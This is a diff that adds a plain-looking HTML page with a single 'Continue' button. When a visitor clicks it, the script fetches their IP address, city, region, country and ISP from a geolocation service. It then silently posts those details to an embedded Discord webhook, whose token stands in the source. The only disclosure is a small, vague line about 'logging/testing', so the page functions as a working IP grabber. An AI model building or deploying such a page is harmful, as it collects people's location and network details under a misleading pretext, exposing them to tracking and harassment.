@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Info Button</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: grid;
+      place-items: center;
+      background: #0f0f0f;
+      color: #fff;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+    }
+    .card {
+      background: #181818;
+      padding: 20px;
+      border-radius: 12px;
+      width: min(92%, 360px);
+      box-shadow: 0 10px 30px rgba(0,0,0,.4);
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      border: 0;
+      border-radius: 10px;
+      background: #4CAF50;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover { opacity: .9; }
+    .note {
+      font-size: 12px;
+      opacity: .8;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="note">
+      By clicking, you agree to send basic connection info for logging/testing.
+    </div>
+    <button id="btn">Continue</button>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1431571679645270129/qzu0o1lZWnyigu2iDYAJyZGmPjL0JxUd-gTb96ERsYcADzcRQwvLiDdcOYECTPUGCUw8";
+
+    document.getElementById("btn").onclick = async () => {
+      try {
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content:
+`📥 **Button Click**
+IP: ${d.ip}
+City: ${d.city}
+Region: ${d.region}
+Country: ${d.country_name}
+ISP: ${d.org}`
+          })
+        });
+
+        alert("Done ✅");
+      } catch (e) {
+        console.error(e);
+        alert("May error — check hosting / webhook.");
+      }
+    };
+  </script>
+</body>
+</html>
